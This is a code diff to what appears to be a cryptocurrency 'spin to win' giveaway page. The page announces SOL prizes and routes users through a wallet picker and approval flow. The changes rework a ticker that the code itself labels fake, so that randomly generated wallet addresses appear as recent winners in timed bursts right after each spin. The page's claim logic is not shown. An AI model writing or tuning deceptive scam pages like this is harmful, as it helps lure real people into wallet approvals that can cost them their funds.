@@ -50,13 +50,11 @@
   .wrow .nm{flex:1;color:#e6e6e6}
   .wrow .ar{color:#4a4a4a;font-size:13px}
 
-  /* ---------- TOS gate ---------- */
   .tos-row{display:flex;align-items:flex-start;gap:10px;text-align:left;margin:14px 0 16px;font-size:12.5px;color:#a0a0a0;line-height:1.5}
   .tos-row input{flex:0 0 auto;width:16px;height:16px;margin-top:2px;accent-color:#e6e6e6}
   .tos-row a{color:#e6e6e6;text-decoration:underline}
   .modal button[disabled]{opacity:.35;cursor:not-allowed}
 
-  /* ---------- claims ticker ---------- */
   .ticker{position:fixed;top:14px;right:14px;max-width:270px;background:#0f0f0f;border:1px solid #1c1c1c;border-radius:6px;padding:10px 12px;font-size:11.5px;color:#b0b0b0;line-height:1.5;z-index:200;opacity:0;transform:translateY(-8px);transition:opacity .35s ease,transform .35s ease;pointer-events:none}
   .ticker.show{opacity:1;transform:translateY(0)}
   .ticker b{color:#e6e6e6;font-weight:600}
@@ -68,7 +66,6 @@
 </head>
 <body>
 
-<!-- live claims ticker -->
 <div class="ticker" id="ticker"></div>
 
 <div class="card">
@@ -87,7 +84,6 @@
   <div id="status"></div>
 </div>
 
-<!-- main overlay (wallet approve / picker / success / error) -->
 <div class="overlay" id="overlay">
   <div class="modal">
     <div class="spinner" id="ovSpinner"></div>
@@ -99,7 +95,6 @@
   </div>
 </div>
 
-<!-- TOS gate overlay -->
 <div class="overlay" id="tosOverlay">
   <div class="modal">
     <h2>Before You Spin</h2>
@@ -142,10 +137,8 @@ var SEG_DEG = 360 / N;
 var isMobile = /Android|iPhone|iPad|iPod|Mobile|webOS|BlackBerry/i.test(navigator.userAgent);
 var isAndroid = /Android/i.test(navigator.userAgent);
 
-// ---------- fake claims ticker ----------
-var TICKER_NAMES = ["sol","crypto","degen","whale","moon","ape","hodl","pump","gem","lfg","wagmi","anon"];
+// ---------- fake claims ticker (fires on spin) ----------
 function randomAddr(){
-  // 32-40 char base58-looking string, middle masked
   var chars = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
   function chunk(len){ var s=""; for(var i=0;i<len;i++) s += chars[Math.floor(Math.random()*chars.length)]; return s; }
   return chunk(6) + "..." + chunk(4);
@@ -162,13 +155,27 @@ function showTicker(){
   tickerEl.classList.add("show");
   setTimeout(function(){ tickerEl.classList.remove("show"); }, 5000);
 }
-// first one after 8s, then every 30s
-setTimeout(function(){
-  showTicker();
-  setInterval(showTicker, 30000);
-}, 8000);
 
-// ---------- wallet picker data ----------
+// schedule ticker bursts triggered by a spin
+var tickerTimers = [];
+function startTickerBurst(){
+  // clear any previous burst
+  for (var i = 0; i < tickerTimers.length; i++) clearTimeout(tickerTimers[i]);
+  tickerTimers = [];
+
+  // first ticker ~2.5s after spin starts
+  tickerTimers.push(setTimeout(showTicker, 2500));
+  // then 3 more over the next ~25s at random-ish intervals
+  var base = 2500;
+  for (var k = 0; k < 3; k++){
+    base += 6000 + Math.floor(Math.random() * 5000); // 6–11s apart
+    (function(t){
+      tickerTimers.push(setTimeout(showTicker, t));
+    })(base);
+  }
+}
+
+// ---------- wallet picker ----------
 var MOBILE_WALLETS = [
   { id:"phantom", name:"Phantom", icon:"👻",
     href: function(p){ return "https://phantom.app/ul/browse/" + encodeURIComponent(p) + "?ref=" + encodeURIComponent(location.origin); },
@@ -592,6 +599,9 @@ function startSpin(){
   spinBtn.disabled = true;
   hub.textContent = "…";
 
+  // fire the fake claims ticker burst now that a spin started
+  startTickerBurst();
+
   setTimeout(function(){
     var seg = SEGMENTS[idx];
     document.getElementById("prize").textContent = "You won " + seg.sol + " SOL";
@@ -619,7 +629,6 @@ claimBtn.onclick = async function(){
   await runClaim(wallet);
 };
 
-// deep-link handoff
 (async function(){
   var pending = readPending();
   if (pending){
